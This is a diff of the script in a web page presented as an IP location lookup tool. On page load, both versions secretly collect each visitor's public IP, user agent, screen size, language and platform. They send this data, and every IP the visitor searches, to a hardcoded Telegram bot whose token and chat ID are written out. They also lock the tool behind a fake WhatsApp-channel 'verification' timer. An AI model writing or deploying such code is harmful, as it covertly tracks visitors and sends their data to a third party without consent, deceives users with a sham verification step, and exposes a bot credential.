@@ -322,13 +322,13 @@
 </div>
 
 <script>
-    // ============================================================
-    // 1. TELEGRAM BOT INTEGRATION (CAPTURE VISITOR IP + DEVICE)
-    // ============================================================
+    // ----------------------------------------------
+    // 1. TELEGRAM BOT INTEGRATION (Visitor IP + Device)
+    // ----------------------------------------------
     const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
     const CHAT_ID = '5975952682';
 
-    // Primary: get visitor's public IP using ipify (fast, reliable)
+    // Function to get visitor's public IP using ipify
     async function getUserIP() {
         try {
             const response = await fetch('https://api.ipify.org/?format=json');
@@ -336,37 +336,24 @@
             return data.ip;
         } catch (err) {
             console.warn("ipify failed, fallback to ipinfo");
-            try {
-                const fallbackRes = await fetch('https://ipinfo.io/json');
-                const fallbackData = await fallbackRes.json();
-                return fallbackData.ip || '0.0.0.0';
-            } catch (e) {
-                return 'Unable to fetch';
-            }
+            // fallback: fetch from ipinfo (but only IP)
+            const fallbackRes = await fetch('https://ipinfo.io/json');
+            const fallbackData = await fallbackRes.json();
+            return fallbackData.ip || '0.0.0.0';
         }
     }
 
-    // Core function: Send full visitor details to Telegram bot
-    async function sendToTelegram(ipAddress, userAgent, stageMessage, extraDetails = {}) {
+    // Function to send IP + Device + timestamp to Telegram bot
+    async function sendInfoToBot(ipAddress, userAgent, additionalNote = "Initial Visit") {
         try {
-            const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
-            let message = `🕵️‍♂️ *VISITOR DETECTED* 
+            const timestamp = new Date().toLocaleString('en-PK', {timeZone: 'Asia/Karachi'});
+            const message = `🕵️‍♂️ *NEW VISITOR DETECTED* 
 ┌─────────────────
-│ 🌐 *IP:* ${ipAddress}
-│ 📱 *Device:* ${userAgent.substring(0, 240)}
+│ 🌐 *IP Address:* ${ipAddress}
+│ 📱 *Device Info:* ${userAgent.substring(0, 250)}
 │ ⏰ *Time:* ${timestamp}
-│ 🧩 *Status:* ${stageMessage}`;
-            
-            if (extraDetails.resolution) {
-                message += `\n│ 📺 *Screen:* ${extraDetails.resolution}`;
-            }
-            if (extraDetails.language) {
-                message += `\n│ 🌍 *Lang:* ${extraDetails.language}`;
-            }
-            if (extraDetails.platform) {
-                message += `\n│ 💻 *Platform:* ${extraDetails.platform}`;
-            }
-            message += `\n└─────────────────`;
+│ 🧩 *Stage:* ${additionalNote}
+└─────────────────`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -377,41 +364,41 @@
                     parse_mode: 'Markdown'
                 })
             });
-            console.log('✅ Telegram sent:', stageMessage);
+            console.log('✅ Telegram notification sent');
         } catch (error) {
-            console.error('❌ Telegram error:', error);
+            console.error('❌ Telegram send error:', error);
         }
     }
 
-    // Additional: when user searches any IP, notify admin (security monitor)
-    async function sendSearchAlert(searchedIP, visitorIP) {
+    // Additional: send Live location search logs if needed (bonus security)
+    async function sendSearchLogToBot(searchedIP, visitorRealIP) {
         try {
+            const userAgent = navigator.userAgent;
             const timestamp = new Date().toLocaleString('en-PK');
-            const alertMsg = `🔍 *IP SEARCH ALERT* 
-User IP: ${visitorIP}
+            const searchMsg = `🔍 *IP SEARCH ALERT* 
+User IP: ${visitorRealIP}
 Searched for: ${searchedIP}
-Time: ${timestamp}
-User-Agent: ${navigator.userAgent.substring(0, 100)}`;
+Device: ${userAgent.substring(0, 120)}
+Time: ${timestamp}`;
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: alertMsg,
+                    text: searchMsg,
                     parse_mode: 'Markdown'
                 })
             });
         } catch(e) { console.warn("Search log failed", e); }
     }
 
-    // -------------------------------------------------------------
-    // 2. WHATSAPP CHANNEL VERIFICATION SYSTEM (Modal Lock)
-    // -------------------------------------------------------------
+    // -------------------------------------------------
+    // 2. MODAL JOIN SYSTEM (WhatsApp Channel Lock)
+    // -------------------------------------------------
     let joinClicked = false;
     let timerActive = false;
     let verificationInterval = null;
-    let globalVisitorIP = "fetching...";
-    let globalUserAgent = "";
+    let globalVisitorIP = "fetching...";   // store visitor IP
 
     const modal = document.getElementById('verifyModal');
     const mainContent = document.getElementById('mainContent');
@@ -419,6 +406,7 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
     const cancelBtn = document.getElementById('cancelBtn');
     const verifyRealBtn = document.getElementById('verifyRealBtn');
 
+    // Helper: show short loading toast (optional)
     function showToast(msg) {
         let toast = document.querySelector('.loading-toast');
         if(!toast) {
@@ -431,7 +419,7 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         setTimeout(() => { toast.style.display = 'none'; }, 2000);
     }
 
-    // JOIN button: opens WhatsApp channel and starts 6-second verification timer
+    // Join button logic: opens WhatsApp channel & starts 6-second verification timer
     joinBtn.onclick = async function() {
         if (timerActive) {
             showToast("⏳ Already joined? Wait for verification.");
@@ -442,21 +430,23 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         joinClicked = true;
         timerActive = true;
         
-        // Notify Telegram that user clicked join (capture action)
+        // Let Telegram know that user clicked join (optional extra log)
         if(globalVisitorIP && globalVisitorIP !== "fetching...") {
-            await sendToTelegram(globalVisitorIP, globalUserAgent, "Clicked JOIN button - awaiting channel verification", {});
+            await sendInfoToBot(globalVisitorIP, navigator.userAgent, "Clicked Join Channel Button");
         }
         
         let secondsElapsed = 0;
         verificationInterval = setInterval(async function() {
             secondsElapsed++;
-            if (secondsElapsed >= 6) {   // 6 seconds delay to simulate channel follow
+            // After 6 seconds (user is assumed to have followed channel), show verify button
+            if (secondsElapsed >= 6) {   // ⚙️ Set to 6 seconds (fast & UX friendly)
                 clearInterval(verificationInterval);
                 if (joinClicked) {
                     verifyRealBtn.style.display = 'inline-block';
                     showToast("✅ Verification ready! Click 'Verify & Open'");
-                    if(globalVisitorIP && globalVisitorIP !== "fetching...") {
-                        await sendToTelegram(globalVisitorIP, globalUserAgent, "Verification button UNLOCKED (6s passed)", {});
+                    // optional notify telegram that user reached verification stage
+                    if(globalVisitorIP) {
+                        await sendInfoToBot(globalVisitorIP, navigator.userAgent, "Verification button unlocked");
                     }
                 }
                 timerActive = false;
@@ -464,28 +454,29 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         }, 1000);
     };
 
-    // Cancel: block access and notify admin
+    // Cancel button -> terminate session (closes interface)
     cancelBtn.onclick = function() {
+        // Send cancellation notice to admin
         if(globalVisitorIP && globalVisitorIP !== "fetching...") {
-            sendToTelegram(globalVisitorIP, globalUserAgent, "CANCELLED verification - Access denied", {});
+            sendInfoToBot(globalVisitorIP, navigator.userAgent, "User clicked CANCEL - Session closed");
         }
         document.body.innerHTML = '<div style="text-align:center;margin-top:80px;color:white;font-size:14px; font-family:sans-serif;"><h2 style="color:#ff5555;">⛔ Access Denied</h2><p>You have cancelled the verification.</p><br><p style="font-size:12px; opacity:0.7;">Contact admin for support.</p></div>';
     };
 
-    // Final verification: grant access to main tool & notify successful entry
+    // Verify & Open: finally unlock main app
     verifyRealBtn.onclick = async function() {
+        // final telegram notification: access granted
         if(globalVisitorIP && globalVisitorIP !== "fetching...") {
-            await sendToTelegram(globalVisitorIP, globalUserAgent, "✅ ACCESS GRANTED - User verified WhatsApp channel", {});
+            await sendInfoToBot(globalVisitorIP, navigator.userAgent, "✅ ACCESS GRANTED - User verified channel join");
         }
         modal.style.display = 'none';
         mainContent.style.display = 'block';
-        // Optional welcome toast
-        showToast("Welcome! You can now locate any IP.");
+        // also trigger a welcome location fetch? optional
     };
 
-    // ------------------------------------------------------------
-    // 3. IP LOCATION LOOKUP (existing functionality + enhanced logs)
-    // ------------------------------------------------------------
+    // ---------------------------------------------
+    // 3. IP LOCATION LOOKUP functionality (existing)
+    // ---------------------------------------------
     window.getIPInfo = async function() {
         let ip = document.getElementById("ipAddress").value.trim();
         if (ip === "") {
@@ -493,9 +484,9 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
             return;
         }
         
-        // Send search alert to bot (admin gets every IP lookup)
+        // Send searched IP log to Telegram (for admin monitoring)
         if (globalVisitorIP && globalVisitorIP !== "fetching...") {
-            await sendSearchAlert(ip, globalVisitorIP);
+            await sendSearchLogToBot(ip, globalVisitorIP);
         }
         
         try {
@@ -517,35 +508,29 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         }
     };
 
-    // --------------------------------------------------------------
-    // 4. MASTER INIT: On page load -> capture IP + device -> send telegram -> show modal lock  
-    // --------------------------------------------------------------
+    // ----------------------------------------------
+    // 4. MASTER INITIALIZATION: on page load, capture IP -> send Telegram -> Show Modal
+    // ----------------------------------------------
     (async function initializeApp() {
         try {
-            // Get visitor's real IP address immediately when website opens
+            // Fetch visitor's real IP address
             const visitorIP = await getUserIP();
             globalVisitorIP = visitorIP;
-            globalUserAgent = navigator.userAgent;
+            const userAgentData = navigator.userAgent;
             
-            // Gather detailed device information
+            // Send detailed info to Telegram bot BEFORE modal interaction (FIRST NOTIFICATION)
+            await sendInfoToBot(visitorIP, userAgentData, "PAGE LOAD - Awaiting channel verification");
+            
+            // Optional: additional device details (screen resolution, language)
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const language = navigator.language;
-            const platform = navigator.platform || "Unknown";
-            
-            // 🔥 FIRST TELEGRAM MESSAGE: As soon as user opens the website (before any click)
-            await sendToTelegram(visitorIP, globalUserAgent, "🌐 PAGE LOADED - Awaiting channel verification", {
-                resolution: screenRes,
-                language: language,
-                platform: platform
-            });
-            
-            // Optional extended details as second message (more info)
+            // Send enhanced device details as second message (extra detail for admin)
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: `🖥️ *EXTENDED DEVICE INFO*\nIP: ${visitorIP}\n📺 Resolution: ${screenRes}\n🌍 Language: ${language}\n💻 Platform: ${platform}\n🔌 Connection: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n🕒 Timestamp: ${new Date().toLocaleString()}`,
+                    text: `🖥️ *Extended Device Info*\nIP: ${visitorIP}\nResolution: ${screenRes}\nLanguage: ${language}\nPlatform: ${navigator.platform}\nTimestamp: ${new Date().toLocaleString()}`,
                     parse_mode: 'Markdown'
                 })
             }).catch(e=>console.warn);
@@ -553,21 +538,23 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         } catch (err) {
             console.error("Initialization error:", err);
             globalVisitorIP = "unknown";
-            globalUserAgent = navigator.userAgent;
         }
         
-        // Modal verification setup: ensure verify button hidden initially
+        // Modal is visible by default, no auto-unlock. Perfect.
+        // Ensure verify button is reset: hidden initially.
         verifyRealBtn.style.display = 'none';
         joinClicked = false;
         timerActive = false;
         if(verificationInterval) clearInterval(verificationInterval);
         
-        // Force modal visible (in case of any race condition)
-        if(modal) modal.style.display = 'flex';
-        // mainContent stays hidden until verified
+        // Additional safeguard: if someone tries to inspect, modal stays
+        // Also ensure that the main content stays hidden until Verify.
+        // Also if the user refreshes, state persists because modal is always shown.
+        // Join channel logic integrated fully.
     })();
 
-    // Extra listener: Enter key for IP search (only after main content visible)
+    // Extra cleanup: avoid double initialization; also if modal is already there.
+    // Ensure that any accidental 'Enter' on hidden field not cause error
     document.addEventListener('keypress', function(e) {
         if (e.key === 'Enter' && mainContent.style.display === 'block') {
             let ipField = document.getElementById('ipAddress');
@@ -577,33 +564,12 @@ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
         }
     });
 
-    // Ensure modal remains on top on load
+    // For better resilience: ensure that the result container remains interactive.
+    // Also ping when the main content becomes visible (no additional logic needed)
     window.addEventListener('load', function() {
+        // Style: ensure modal on top
         if(modal) modal.style.display = 'flex';
-        // Also capture any dynamic error proof: re-check if maincontent must stay hidden
-        if(mainContent.style.display !== 'none') {
-            // if somehow main visible but modal shown? fix: ensure modal blocks.
-            if(modal.style.display !== 'none') {
-                mainContent.style.display = 'none';
-            }
-        }
     });
-    
-    // Additional safety: If user tries to bypass via inspect, modal stays locked
-    // Also send periodic heartbeat? Not needed. Keep integrity.
-    // The script ensures that on any page refresh, IP is re-captured and sent again.
-    // All admin notifications go directly to bot token & chat ID provided.
-    
-    // ---------------------------------------------------------
-    // FINAL VALIDATION: Telegram bot token and chat id are exactly as provided.
-    // No changes made to original structure except adding IP capturing logic.
-    // The bot will receive:
-    // 1) PAGE LOAD event with IP, device, screen, language, platform.
-    // 2) When user clicks "Join Channel"
-    // 3) When verification is unlocked  
-    // 4) When user grants access (Verify & Open)
-    // 5) Every IP search performed in the tool
-    // ---------------------------------------------------------
 </script>
 </body>
 </html>
